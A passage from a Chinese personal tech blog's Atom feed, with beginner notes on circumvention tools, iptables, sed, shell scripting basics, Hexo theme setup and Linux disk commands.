    <content type="html"><![CDATA[<h4 id="我已经收藏了不少大佬的博客了，-可是却很少仔仔细细的全面看过，-趁着今天有点累又闲来无事，-摘录其中比较有用的内容"><a href="#我已经收藏了不少大佬的博客了，-可是却很少仔仔细细的全面看过，-趁着今天有点累又闲来无事，-摘录其中比较有用的内容" class="headerlink" title="我已经收藏了不少大佬的博客了， 可是却很少仔仔细细的全面看过， 趁着今天有点累又闲来无事， 摘录其中比较有用的内容"></a>我已经收藏了不少大佬的博客了， 可是却很少仔仔细细的全面看过， 趁着今天有点累又闲来无事， 摘录其中比较有用的内容</h4><a id="more"></a><h5 id="一些免费的翻墙软件"><a href="#一些免费的翻墙软件" class="headerlink" title="一些免费的翻墙软件"></a>一些免费的翻墙软件</h5><p>来自刘伟的博客， 不过我筛选了一些， 因为很多已经没用了</p><hr><p>蓝灯</p><ul><li>优点：有免费版，并且抗封能力较强<br>缺点：有流量限制：每月500MB，不支持iPhone、iPad<br>系统：Linux、Windows、MacOS、Android<br>中文：支持中文<br>下载：<a href="https://getlantern.org/" title="蓝灯官网" target="_blank" rel="noopener">蓝灯官网</a>(需翻墙), <a href="https://github.com/getlantern/forum/issues/833" title="GitHub地址" target="_blank" rel="noopener">GitHub地址</a>(不需要翻墙)</li></ul><hr><p>无界</p><ul><li>优点：无流量限制<br>缺点：不稳定，不支持iPhone、iPad<br>系统：Linux、Windows、Android<br>中文：支持中文<br>下载：<a href="http://www.wujieliulan.com/download.htm" title="无界官网" target="_blank" rel="noopener">无界官网</a>(需翻墙)</li></ul><hr><p>Tor</p><ul><li>优点：无流量限制<br>缺点：速度很慢，不稳定，翻墙时需使用专门的浏览器Tor Browser，不支持iPhone、iPad<br>系统：Linux、Windows、MacOS、Android<br>中文：网站无中文版，但软件有中文版<br>下载：<a href="https://www.torproject.org/" title="Tor官网" target="_blank" rel="noopener">Tor官网</a>(需翻墙)</li></ul><p><a href="https://sphard2.github.io/gfw/" target="_blank" rel="noopener">科学上网翻墙教程</a></p><h5 id="了解一下iptables"><a href="#了解一下iptables" class="headerlink" title="了解一下iptables"></a>了解一下iptables</h5><p><a href="https://wangchujiang.com/linux-command/c/iptables.html" target="_blank" rel="noopener">iptables</a><br>iptables命令 是Linux上常用的防火墙软件，是netfilter项目的一部分。可以直接配置，也可以通过许多前端和图形界面配置。</p><p>防火墙的策略<br>防火墙策略一般分为两种，一种叫通策略，一种叫堵策略，通策略，默认门是关着的，必须要定义谁能进。堵策略则是，大门是洞开的，但是你必须有身份认证，否则不能进，所以通，是要全通，而堵，则是要选择。</p><p> 实际例子<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">iptables -F  # 清空所有的防火墙规则</span><br><span class="line">iptables -X  # 删除用户自定义的空链</span><br><span class="line">iptables -Z  # 清空计数</span><br></pre></td></tr></table></figure></p><p>配置允许ssh端口连接<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">iptables -A INPUT -s 192.168.1.0/24 -p tcp --dport 22 -j ACCEPT</span><br><span class="line"># 22为你的ssh端口， -s 192.168.1.0/24表示允许这个网段的机器来连接，</span><br><span class="line">#其它网段的ip地址是登陆不了你的机器的。 -j ACCEPT表示接受这样的请求</span><br></pre></td></tr></table></figure></p><p>允许本地回环地址可以正常使用</p><h5 id="推荐几个图床"><a href="#推荐几个图床" class="headerlink" title="推荐几个图床"></a>推荐几个图床</h5><blockquote><ol><li>imgur(非常流行,强烈推荐): <a href="https://imgur.com/" target="_blank" rel="noopener">https://imgur.com</a></li><li>SM.MS(适合国内用户,但自己很难控制图片): <a href="https://sm.ms/" target="_blank" rel="noopener">https://sm.ms</a></li><li>upload.cc(繁体界面): <a href="https://upload.cc/" target="_blank" rel="noopener">https://upload.cc</a></li><li>路过图床: <a href="https://imgchr.com/" target="_blank" rel="noopener">https://imgchr.com</a></li><li>img9.top 无限图床: <a href="https://img9.top/" target="_blank" rel="noopener">https://img9.top</a></li><li>imgbox(英文界面): <a href="https://imgbox.com/" target="_blank" rel="noopener">https://imgbox.com</a></li><li>ooxx.ooo(英文界面): <a href="https://ooxx.ooo/" target="_blank" rel="noopener">https://ooxx.ooo</a></li><li>postimage(英文界面): <a href="https://postimages.org/" target="_blank" rel="noopener">https://postimages.org</a></li><li>imgurl(中文界面): <a href="https://imgurl.org/" target="_blank" rel="noopener">https://imgurl.org</a></li></ol></blockquote><h5 id="next主题进一步优化"><a href="#next主题进一步优化" class="headerlink" title="next主题进一步优化"></a>next主题进一步优化</h5><p><a href="https://reishin.me/hexo-next-optimization/#%E6%96%B0%E5%BB%BA%E6%96%87%E7%AB%A0" target="_blank" rel="noopener">next主题优化</a></p><p><a href="https://reishin.me/blog-seo-optimization/" target="_blank" rel="noopener">提交博客到Google和百度的方法</a></p><h5 id="docker-基础知识"><a href="#docker-基础知识" class="headerlink" title="docker 基础知识"></a>docker 基础知识</h5><p><a href="https://reishin.me/docker-base/" target="_blank" rel="noopener">docker基础知识总结</a></p><h5 id="php命令行调试"><a href="#php命令行调试" class="headerlink" title="php命令行调试"></a>php命令行调试</h5><p><a href="https://han8gui.github.io/2017/05/17/PHP%E7%A8%8B%E5%BA%8F%E5%A6%82%E4%BD%95debug/" target="_blank" rel="noopener">PHP 程序如何debug</a></p><h6 id="检查是否有语法错误"><a href="#检查是否有语法错误" class="headerlink" title="检查是否有语法错误"></a>检查是否有语法错误</h6><blockquote><p>php -l test.php</p></blockquote><h6 id="基本调试API"><a href="#基本调试API" class="headerlink" title="基本调试API"></a>基本调试API</h6><blockquote><p>var_dump(\$var);print_r(\$var);echo \$var;</p></blockquote><h6 id="基本的配置"><a href="#基本的配置" class="headerlink" title="基本的配置"></a>基本的配置</h6><blockquote><p>display_errors、log_errors、error_reporting、error_log</p></blockquote>]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;我已经收藏了不少大佬的博客了，-可是却很少仔仔细细的全面看过，-趁着今天有点累又闲来无事，-摘录其中比较有用的内容&quot;&gt;&lt;a href=&quot;#我已经收藏了不少大佬的博客了，-可是却很少仔仔细细的全面看过，-趁着今天有点累又闲来无事，-摘录其中比较有用的内容&quot; class=&quot;headerlink&quot; title=&quot;我已经收藏了不少大佬的博客了， 可是却很少仔仔细细的全面看过， 趁着今天有点累又闲来无事， 摘录其中比较有用的内容&quot;&gt;&lt;/a&gt;我已经收藏了不少大佬的博客了， 可是却很少仔仔细细的全面看过， 趁着今天有点累又闲来无事， 摘录其中比较有用的内容&lt;/h4&gt;
    
    </summary>
    
    
      <category term="Linux" scheme="https://prontosil.club/tags/Linux/"/>
    
      <category term="docker" scheme="https://prontosil.club/tags/docker/"/>
    
      <category term="VPN" scheme="https://prontosil.club/tags/VPN/"/>
    
      <category term="fq" scheme="https://prontosil.club/tags/fq/"/>
    
      <category term="iptables" scheme="https://prontosil.club/tags/iptables/"/>
    
  </entry>
  
  <entry>
    <title>sed命令详解</title>
    <link href="https://prontosil.club/2019/02/04/sed%E5%91%BD%E4%BB%A4%E8%AF%A6%E8%A7%A3/"/>
    <id>https://prontosil.club/2019/02/04/sed命令详解/</id>
    <published>2019-02-04T06:53:00.000Z</published>
    <updated>2019-02-10T13:44:28.258Z</updated>
    
    <content type="html"><![CDATA[<h4 id="abstract"><a href="#abstract" class="headerlink" title="abstract"></a>abstract</h4><p>哪怕是除夕也要坚持更新博客</p><h4 id="sed-简介"><a href="#sed-简介" class="headerlink" title="sed 简介"></a>sed 简介</h4><p>sed 是一个很强大的文本编辑器。 可以对来自文本， 以及标准输入的文本进行编辑<br>sed会从文件或者标准输入中读取一行，将其复制到缓冲区，对文本编辑完成之后，读取下一行直到所有的文本行都编辑完毕。</p><a id="more"></a><p><img src="https://upload-images.jianshu.io/upload_images/10651191-e4ab0e50bbf3371f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="选项及其作用"></p><p>话不多说直接上示例</p><ul><li><p>替换文本中的字符串</p><blockquote><p>sed ‘s/book/books/‘ filename</p></blockquote></li><li><p>-n 打印行号， p打印。 打印出那些发生替换的行</p><blockquote><p>sed -n ‘s/test/TEST/p’ filename</p></blockquote></li><li><p>直接编辑文件选项-i， 匹配文件中的每一行并替换</p><blockquote><p>sed  -i ‘s/book/books/g’ filename</p></blockquote></li><li><p>全面替换标记g</p><blockquote><p>sed ‘s/book/books/g’  filename</p></blockquote></li><li><p>当需要从第N处开始匹配时， 可以使用/Ng<br>echo sksksksks | sed ‘s/sk/SK/2g’</p></li><li><p>/经常被用来做定界符， 同时也可以使用任意的定界符， 如: or |</p></li><li><p>定界符出现在内部时， 需要进行转义</p><blockquote><p>sed ‘s/\\/bin/\\/usr\\/local\\/bin/g’</p></blockquote></li></ul><h4 id="命令参数如下"><a href="#命令参数如下" class="headerlink" title="命令参数如下"></a>命令参数如下</h4><blockquote><p><strong>a\\</strong> 在当前行下面插入文本。<br><strong>i\\</strong> 在当前行上面插入文本。<br><strong>c\\</strong> 把选定的行改为新的文本。<br><strong>d</strong> 删除，删除选择的行。<br><strong>D</strong> 删除模板块的第一行。<br><strong>s</strong> 替换指定字符<br><strong>h</strong> 拷贝模板块的内容到内存中的缓冲区。<br><strong>H</strong> 追加模板块的内容到内存中的缓冲区。<br><strong>g</strong> 获得内存缓冲区的内容，并替代当前模板块中的文本。<br><strong>G</strong> 获得内存缓冲区的内容，并追加到当前模板块文本的后面。<br><strong>l</strong> 列表不能打印字符的清单。<br><strong>n</strong> 读取下一个输入行，用下一个命令处理新的行而不是用第一个命令。<br><strong>N</strong> 追加下一个输入行到模板块后面并在二者间嵌入一个新行，改变当前行号码。<br><strong>p</strong> 打印模板块的行。<br><strong>P</strong>(大写) 打印模板块的第一行。<br><strong>q</strong> 退出Sed。<br><strong>b lable</strong> 分支到脚本中带有标记的地方，如果分支不存在则分支到脚本的末尾。<br><strong>r file</strong> 从file中读行。<br><strong>t label</strong> if分支，从最后一行开始，条件一旦满足或者T，t命令，将导致分支到带有标号的命令处，或者到脚本的末尾。<br><strong>T label</strong> 错误分支，从最后一行开始，一旦发生错误或者T，t命令，将导致分支到带有标号的命令处，或者到脚本的末尾。<br><strong><a href="http://man.linuxde.net/w" title="w命令" target="_blank" rel="noopener">w</a> file</strong> 写并追加模板块到file末尾。<br><strong>W file</strong> 写并追加模板块的第一行到file末尾。<br><strong>!</strong> 表示后面的命令对所有没有被选定的行发生作用。<br><strong>=</strong> 打印当前行号码。<br><strong>#</strong> 把注释扩展到下一个换行符以前。 </p></blockquote>]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;abstract&quot;&gt;&lt;a href=&quot;#abstract&quot; class=&quot;headerlink&quot; title=&quot;abstract&quot;&gt;&lt;/a&gt;abstract&lt;/h4&gt;&lt;p&gt;哪怕是除夕也要坚持更新博客&lt;/p&gt;
&lt;h4 id=&quot;sed-简介&quot;&gt;&lt;a href=&quot;#sed-简介&quot; class=&quot;headerlink&quot; title=&quot;sed 简介&quot;&gt;&lt;/a&gt;sed 简介&lt;/h4&gt;&lt;p&gt;sed 是一个很强大的文本编辑器。 可以对来自文本， 以及标准输入的文本进行编辑&lt;br&gt;sed会从文件或者标准输入中读取一行，将其复制到缓冲区，对文本编辑完成之后，读取下一行直到所有的文本行都编辑完毕。&lt;/p&gt;
    
    </summary>
    
      <category term="Linux" scheme="https://prontosil.club/categories/Linux/"/>
    
    
      <category term="Linux" scheme="https://prontosil.club/tags/Linux/"/>
    
      <category term="shell" scheme="https://prontosil.club/tags/shell/"/>
    
  </entry>
  
  <entry>
    <title>序</title>
    <link href="https://prontosil.club/2019/02/04/%E5%BA%8F/"/>
    <id>https://prontosil.club/2019/02/04/序/</id>
    <published>2019-02-04T06:46:32.000Z</published>
    <updated>2019-02-05T13:12:16.211Z</updated>
    
    <content type="html"><![CDATA[<blockquote class="blockquote-center"><p>我总是在不断地追寻着， 却又时常忘记自己身在何方</p></blockquote><p>欢迎光临百浪多息的博客！</p><p>挂上一些友情链接</p><p><a href="http://stackexit.cn/?tdsourcetag=s_pctim_aiomsg" target="_blank" rel="noopener">http://stackexit.cn/?tdsourcetag=s_pctim_aiomsg</a></p><p><a href="https://blog.szfszf.top/" target="_blank" rel="noopener">https://blog.szfszf.top/</a></p><p><a href="https://darrenliuwei.com/" target="_blank" rel="noopener">https://darrenliuwei.com/</a></p><p><a href="https://blankj.com/" target="_blank" rel="noopener">https://blankj.com/</a></p><p><a href="https://sphard.com/" target="_blank" rel="noopener">https://sphard.com/</a></p><p><a href="http://iamwr.com/" target="_blank" rel="noopener">http://iamwr.com/</a></p><p><a href="https://leaferx.online/" target="_blank" rel="noopener">https://leaferx.online/</a></p><p><a href="https://kinegratii.github.io/" target="_blank" rel="noopener">https://kinegratii.github.io/</a></p><p><a href="http://iamwr.com/" target="_blank" rel="noopener">http://iamwr.com/</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote class=&quot;blockquote-center&quot;&gt;&lt;p&gt;我总是在不断地追寻着， 却又时常忘记自己身在何方&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;欢迎光临百浪多息的博客！&lt;/p&gt;
&lt;p&gt;挂上一些友情链接&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://s
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>LinuxShellScrips</title>
    <link href="https://prontosil.club/2019/02/04/LinuxShellScrips/"/>
    <id>https://prontosil.club/2019/02/04/LinuxShellScrips/</id>
    <published>2019-02-04T01:29:46.000Z</published>
    <updated>2019-02-10T13:38:05.645Z</updated>
    
    <content type="html"><![CDATA[<h4 id="echo命令"><a href="#echo命令" class="headerlink" title="echo命令"></a>echo命令</h4><h5 id="echo嵌入变量"><a href="#echo嵌入变量" class="headerlink" title="echo嵌入变量"></a>echo嵌入变量</h5><blockquote><p>echo “Hello $LOGNAME, Have a nice day !”</p></blockquote><p>echo 使用一对双引号， 同时会把对应的变量，转化为对应的值</p><h5 id="echo嵌入命令"><a href="#echo嵌入命令" class="headerlink" title="echo嵌入命令"></a>echo嵌入命令</h5><blockquote><p>echo “Your are working in directory `pwd`.”</p></blockquote><p>使用一对 ` ` 在echo中嵌入命令</p><blockquote><p>echo “You are working on a machine called `uname -n`.”</p></blockquote><p>uname -n<br>-n, —nodename : print the network node hostname</p><h5 id="显示时间"><a href="#显示时间" class="headerlink" title="显示时间"></a>显示时间</h5><blockquote><p> echo “Bye for now $LOGNAME. The time is <code>date +%T</code>!”</p></blockquote><p>date输出的结果</p><blockquote><p>Mon Feb  4 09:08:50 DST 2019<br>date +%T<br>使用 %H:%M:%S来显示时间</p></blockquote><h5 id="echo，-单引号，-变量"><a href="#echo，-单引号，-变量" class="headerlink" title="echo， 单引号， 变量"></a>echo， 单引号， 变量</h5><blockquote><p>planet=”Earth”<br>echo \$planet<br># Earth<br>echo ‘\$planet’<br># \$planet<br>echo “\$planet”<br>#Earth</p></blockquote><p>echo也可以不加单引号在屏幕上打印出 $planet</p><blockquote><p>echo \$planet</p></blockquote><p>可以理解成单引号会里面的所有字符都会原样的打印出来， 而双引号中的变量会被对应的值取代， 不加引号和加了双引号的效果是一样的。不过同样的在双引号和不加双引号都可以用转义符。</p><h5 id="echo与-read交互"><a href="#echo与-read交互" class="headerlink" title="echo与 read交互"></a>echo与 read交互</h5><blockquote><p>echo Enter some text<br>read planet<br>echo \’\$planet\’ now equals \$planet<br>exit 0</p></blockquote><h4 id="环境变量"><a href="#环境变量" class="headerlink" title="环境变量"></a>环境变量</h4><p>先来看一个恶作剧脚本</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> TZ=America/Los_Angeles</span><br><span class="line"><span class="built_in">echo</span> <span class="string">"Your Timezone is = <span class="variable">$TZ</span>"</span></span><br><span class="line">date</span><br><span class="line"><span class="built_in">export</span> TZ=Asia/Tokyo</span><br><span class="line"><span class="built_in">echo</span> <span class="string">"Your Timezone is = <span class="variable">$TZ</span>"</span></span><br><span class="line">date</span><br><span class="line"><span class="built_in">unset</span> TZ</span><br><span class="line"><span class="built_in">echo</span> <span class="string">"Your Timezone is = <span class="variable">$(cat /etc/timezone)</span>"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># For Redhat or Fedora /etc/localtime</span></span><br></pre></td></tr></table></figure><p>date</p><p>TZ即是TimeZone， 在双引号下 $TZ 会被对应的值取代。在设置好TZ之后显示的date会随着变化。</p><p>最好玩的是这句：</p><blockquote><p>echo “Your Timezone is = \$(cat /etc/timezone)”</p></blockquote><p>等价于</p><blockquote><p>echo “Your Timezone is = `cat /etc/timezone`“</p></blockquote><h4 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line">FRUIT[0]=&quot;Pears&quot;</span><br><span class="line">FRUIT[1]=&quot;Apple&quot;</span><br><span class="line">FRUIT[2]=&quot;Mango&quot;</span><br><span class="line">FRUIT[3]=&quot;Banana&quot;</span><br><span class="line">FRUIT[4]=&quot;Papaya&quot;</span><br><span class="line">echo &quot;First Index: $&#123;FRUIT[0]&#125;&quot;</span><br><span class="line">echo &quot;Second Index: $&#123;FRUIT[1]&#125;&quot;</span><br></pre></td></tr></table></figure><p>先设置一系列的数组的值，通过在echo使用 <code>${}</code><br>如果我们这样做</p><blockquote><p>echo “First Index: $FRUIT[0] “</p></blockquote><p>打印出来的结果为：</p><blockquote><p>First Index: Pears[0]</p></blockquote><p>所以我们必须用一个大括号</p><p>如果要一次性打印出数组内所有的内容：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;Method One : $&#123;FRUIT[*]&#125;&quot;</span><br><span class="line">echo &quot;Method Two : $&#123;FRUIT[@]&#125;&quot;</span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;echo命令&quot;&gt;&lt;a href=&quot;#echo命令&quot; class=&quot;headerlink&quot; title=&quot;echo命令&quot;&gt;&lt;/a&gt;echo命令&lt;/h4&gt;&lt;h5 id=&quot;echo嵌入变量&quot;&gt;&lt;a href=&quot;#echo嵌入变量&quot; class=&quot;headerlink&quot; 
      
    
    </summary>
    
      <category term="Linux" scheme="https://prontosil.club/categories/Linux/"/>
    
    
      <category term="Linux" scheme="https://prontosil.club/tags/Linux/"/>
    
      <category term="shell" scheme="https://prontosil.club/tags/shell/"/>
    
  </entry>
  
  <entry>
    <title>next主题优化</title>
    <link href="https://prontosil.club/2019/02/03/next%E4%B8%BB%E9%A2%98%E4%BC%98%E5%8C%96-1/"/>
    <id>https://prontosil.club/2019/02/03/next主题优化-1/</id>
    <published>2019-02-03T11:10:30.000Z</published>
    <updated>2019-02-15T06:05:49.485Z</updated>
    
    <content type="html"><![CDATA[<blockquote class="blockquote-center"><p>爱美之心人皆有之</p></blockquote><h4 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h4><p>说实话我已经不记得当初是怎么搭建好博客的了，只是感觉next主题的风格实在是太美了，尤其是那些飘动的浮线。 新年要有新气象。 所以我也需要重新考虑自己是不是要针对自己的主题进行一次优化了。</p><h4 id="hexo搭建博客"><a href="#hexo搭建博客" class="headerlink" title="hexo搭建博客"></a>hexo搭建博客</h4><h5 id="在本地搭建hexo博客页面"><a href="#在本地搭建hexo博客页面" class="headerlink" title="在本地搭建hexo博客页面"></a>在本地搭建hexo博客页面</h5><p>建立在已经安装好了node.js的基础之上</p><blockquote><p>mkdir blog<br>cd blog</p></blockquote><p>之后在blog目录下运行</p><blockquote><p>npm install -g hexo-cli<br>hexo init blog</p></blockquote><p>这个时候的博客雏形就已经基本完成了</p><p>基本的四个命令如下</p><blockquote><p>hexo clean //清楚静态文件<br>hexo g //生成博客页面<br>hexo s //在本地运行， 默认在4000端口， 可以预览一下效果<br>hexo d //部署到GitHub page上</p></blockquote><a id="more"></a><p>hexo的主目录下会有如下一些文件和目录</p><p><img src="https://upload-images.jianshu.io/upload_images/10651191-c91008f2bbadd333.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="hexo主目录"></p><p><strong>需要注意的是我们此时的操作都是在这个目录下进行的</strong><br>其中的<strong>_config.yml</strong>文件我们称之为 <strong>站点配置文件</strong></p><p>默认的主题是 <strong>landscape</strong></p><h6 id="与GitHub相关联"><a href="#与GitHub相关联" class="headerlink" title="与GitHub相关联"></a>与GitHub相关联</h6><ul><li><p>打开我们的站点配置文件<br> 翻到最后修改为:<br> <img src="https://upload-images.jianshu.io/upload_images/10651191-564d2fb7c472fa7e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="修改站点配置文件"></p></li><li><p>最后安装一下git部署插件</p><blockquote><p>npm install hexo-deployer-git —save</p></blockquote></li><li><p>markdown语法进阶<br>之后再来补坑</p></li><li><p>寻找图床<br>这个很简单， 平时直接用简书写作就行， 然后直接复制粘贴到自己想要发表的博客上</p></li><li><p>然后还有一些自我描述， 社交， 打赏什么的也很简单</p></li><li><p>添加网易云音乐<br>用网易云播放器生成外链， 修改blog\themes\next\layout_macro的sidebar.swig文件，添加刚刚复制的外链代码，<br><img src="https://upload-images.jianshu.io/upload_images/10651191-a329665cf6305bdd.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="修改代码"></p></li></ul><p>应该就能达到效果了， next主题的配置之后再谈</p><ul><li>设置背景<br>挑选图片， 命名为background.jpg ， 放在blog\themes\next\source\images里面，<br>在blog\themes\next\source\css_custom文件的custom.styl首部添加<blockquote><p>body {<br>background:url(/images/background.jpg);<br>background-attachment: fixed;<br>}</p></blockquote></li></ul><ul><li>增加侧边栏菜单条目<br>默认的侧栏菜单条目有：首页、归档、标签、关于、搜索等。如果你想要增加其他的菜单条目，修改主题配置文件_config.yml里的Menu Settings中的menu和menu_icons两个地方<br><img src="https://upload-images.jianshu.io/upload_images/10651191-974cc41833f48959.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></li></ul><p>一个是配置页面位置的， 一个是配置图标的，图标来源是<a href="http://link.zhihu.com/?target=http%3A//fontawesome.io/" target="_blank" rel="noopener">Font Awesome</a> , 设置好之后需要在命令行中输入</p><blockquote><p>hexo new page “你所要增加的菜单项名称（要和你在menu中的填写要匹配）”</p></blockquote><h4 id="next主题优化"><a href="#next主题优化" class="headerlink" title="next主题优化"></a>next主题优化</h4><h5 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h5><blockquote><p> cd your-hexo-site<br> git clone <a href="https://github.com/iissnan/hexo-theme-next" target="_blank" rel="noopener">https://github.com/iissnan/hexo-theme-next</a> themes/next</p></blockquote><h5 id="启用next"><a href="#启用next" class="headerlink" title="启用next"></a>启用next</h5><p>修改一下 站点配置文件的theme</p><blockquote><p>theme: next</p></blockquote><h5 id="next主题设置"><a href="#next主题设置" class="headerlink" title="next主题设置"></a>next主题设置</h5><ul><li>Muse - 默认 Scheme，这是 NexT 最初的版本，黑白主调，大量留白</li><li>Mist - Muse 的紧凑版本，整洁有序的单栏外观</li><li>Pisces - 双栏 Scheme，小家碧玉似的清新</li></ul><h5 id="设置语言"><a href="#设置语言" class="headerlink" title="设置语言"></a>设置语言</h5><p>修改站点配置文件的</p><blockquote><p>language: zh-Hans</p></blockquote><h5 id="设置菜单"><a href="#设置菜单" class="headerlink" title="设置菜单"></a>设置菜单</h5><p>修改主题<br><img src="https://upload-images.jianshu.io/upload_images/10651191-c6a2b693f2366bdc.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="鱼.jpg"><br>配置文件的menu</p><p>—-这里略过， 我很懵</p>]]></content>
    
    <summary type="html">
    
      &lt;blockquote class=&quot;blockquote-center&quot;&gt;&lt;p&gt;爱美之心人皆有之&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h4 id=&quot;写在前面&quot;&gt;&lt;a href=&quot;#写在前面&quot; class=&quot;headerlink&quot; title=&quot;写在前面&quot;&gt;&lt;/a&gt;写在前面&lt;/h4&gt;&lt;p&gt;说实话我已经不记得当初是怎么搭建好博客的了，只是感觉next主题的风格实在是太美了，尤其是那些飘动的浮线。 新年要有新气象。 所以我也需要重新考虑自己是不是要针对自己的主题进行一次优化了。&lt;/p&gt;
&lt;h4 id=&quot;hexo搭建博客&quot;&gt;&lt;a href=&quot;#hexo搭建博客&quot; class=&quot;headerlink&quot; title=&quot;hexo搭建博客&quot;&gt;&lt;/a&gt;hexo搭建博客&lt;/h4&gt;&lt;h5 id=&quot;在本地搭建hexo博客页面&quot;&gt;&lt;a href=&quot;#在本地搭建hexo博客页面&quot; class=&quot;headerlink&quot; title=&quot;在本地搭建hexo博客页面&quot;&gt;&lt;/a&gt;在本地搭建hexo博客页面&lt;/h5&gt;&lt;p&gt;建立在已经安装好了node.js的基础之上&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;mkdir blog&lt;br&gt;cd blog&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;之后在blog目录下运行&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;npm install -g hexo-cli&lt;br&gt;hexo init blog&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;这个时候的博客雏形就已经基本完成了&lt;/p&gt;
&lt;p&gt;基本的四个命令如下&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;hexo clean //清楚静态文件&lt;br&gt;hexo g //生成博客页面&lt;br&gt;hexo s //在本地运行， 默认在4000端口， 可以预览一下效果&lt;br&gt;hexo d //部署到GitHub page上&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="瞎折腾" scheme="https://prontosil.club/categories/%E7%9E%8E%E6%8A%98%E8%85%BE/"/>
    
    
      <category term="hexo" scheme="https://prontosil.club/tags/hexo/"/>
    
      <category term="折腾" scheme="https://prontosil.club/tags/%E6%8A%98%E8%85%BE/"/>
    
  </entry>
  
  <entry>
    <title>Linux文件与磁盘管理</title>
    <link href="https://prontosil.club/2019/02/03/Linux%E6%96%87%E4%BB%B6%E4%B8%8E%E7%A3%81%E7%9B%98%E7%AE%A1%E7%90%86/"/>
    <id>https://prontosil.club/2019/02/03/Linux文件与磁盘管理/</id>
    <published>2019-02-03T01:24:23.000Z</published>
    <updated>2019-02-03T11:52:25.257Z</updated>
    
    <content type="html"><![CDATA[<h4 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h4><p>还记得第一次安装虚拟机之后，安装VMware tools的痛苦经历，安装tools的时候会自动弹入一个.tar的文件， 当然我一看就知道是压缩文件， 但是在Linux的图形界面中是怎么也打不开的。 后来百度之后才知道需要用命令行去解压缩， 我的个乖乖， 那么长的文件名我硬是一个个输进去的。。。想想都觉得自己当时好zz</p><h4 id="磁盘管理"><a href="#磁盘管理" class="headerlink" title="磁盘管理"></a>磁盘管理</h4><h5 id="磁盘的构造"><a href="#磁盘的构造" class="headerlink" title="磁盘的构造"></a>磁盘的构造</h5><p>这部分的内容其实是很重要的，但是我现在还不想写， 虽然这部分的内容我是看了不下很多次， 但是始终不是很明白。</p><a id="more"></a><h5 id="Linux磁盘管理的命令"><a href="#Linux磁盘管理的命令" class="headerlink" title="Linux磁盘管理的命令"></a>Linux磁盘管理的命令</h5><p><code>df</code><br><strong>用来检查文件系统的磁盘空间占用情况</strong><br>-a 列出所有的文件系统， 包括系统特有的/proc等文件系统<br>(记得曾经写过/proc是一个虚拟的文件系统)<br>df可以列出所有的文件系统但是不包括/proc等比较特殊的文件系统）<br><img src="https://upload-images.jianshu.io/upload_images/10651191-721790b4dbffc71a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="df - a"></p><p>这里用的是WSL系统， 反映出的文件系统居然没有NTFS。emm不造了</p><p>-k , -m, -h 其中 -k是以KB， -m是以MB， -h以一种比较友好的方式显示出来<br>-H 以千进制 替换 1024进制</p><h2 id="T-显示文件系统类型"><a href="#T-显示文件系统类型" class="headerlink" title="-T 显示文件系统类型"></a>-T 显示文件系统类型</h2><blockquote><p>写道这里我突然明白了， 文件系统和文件系统类型是两个东西， 一个是FileSystem, 另外一个是 FileSystemType 这是不同的概念</p></blockquote><p><img src="https://upload-images.jianshu.io/upload_images/10651191-b050045de693ff1e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="df -Tha"></p><p>-i 不用硬盘容量， 而以inode的数量来显示</p><hr><p>inode 的坑之后再补</p><p><code>du</code><br><strong>也是查看空间的， 但du是对文件和目录磁盘使用的空间的查看</strong><br>参数如下<br>-a 列出所有的文件与目录容量<br>-h 友好的方式<br>-s 列出总量<br>-S 不包括子目录下的总计<br>-k, -m 与df命令一样</p><p><code>fdisk</code><br><strong>磁盘分区表的操作工具</strong><br>-l 输出后面的接的装置所有的内容</p><p><code>mkfs</code><br><strong>磁盘格式化命令</strong></p><blockquote><p>mkfs [-t 文件系统格式] 装置文件名</p></blockquote><p><code>fsck</code><br><strong>用来检查和维护不一致的文件系统</strong></p><blockquote><p>fsck [-t 文件系统] [-ACay] 